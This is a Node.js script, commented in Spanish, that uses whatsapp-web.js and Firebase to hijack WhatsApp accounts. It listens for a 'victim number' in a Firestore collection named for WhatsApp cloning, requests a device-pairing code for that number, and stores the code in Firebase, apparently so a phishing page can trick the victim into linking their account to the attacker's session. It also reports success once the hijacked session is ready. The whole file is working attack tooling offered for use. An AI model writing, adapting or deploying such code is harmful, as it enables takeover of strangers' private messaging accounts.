const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();

// EL TRUCO PARA QUE RENDER ENCUENTRE EL NAVEGADOR
const puppeteerOptions = {
    headless: true,
    args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--single-process',
        '--no-zygote'
    ]
    // QUITAMOS TOTALMENTE 'executablePath' PARA QUE AUTOMÁTICAMENTE 
    // BUSQUE EL QUE INSTALÓ EL COMANDO NPX
};

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: puppeteerOptions
});

// ESCUCHA COMANDOS DE CÓDIGO
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    const data = snap.data();
    if (data && data.status === "solicitando_codigo" && data.numero_victima) {
        console.log("Generando código para:", data.numero_victima);
        try {
            // SOLICITA EL CÓDIGO A WHATSAPP
            const code = await client.requestPairingCode(data.numero_victima);
            await snap.ref.update({ pairingCode: code, status: "mostrando_codigo" });
            console.log("CÓDIGO ENVIADO A FIREBASE:", code);
        } catch (e) {
            console.log("Error al pedir pairing code:", e.message);
        }
    }
});

client.on('ready', () => {
    console.log("SISTEMA LISTO - CONEXIÓN EXITOSA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(err => console.log("Error al inicializar:", err));

// SERVIDOR DE SALUD
http.createServer((req, res) => { res.end('MOTOR ONLINE'); }).listen(process.env.PORT || 3000);
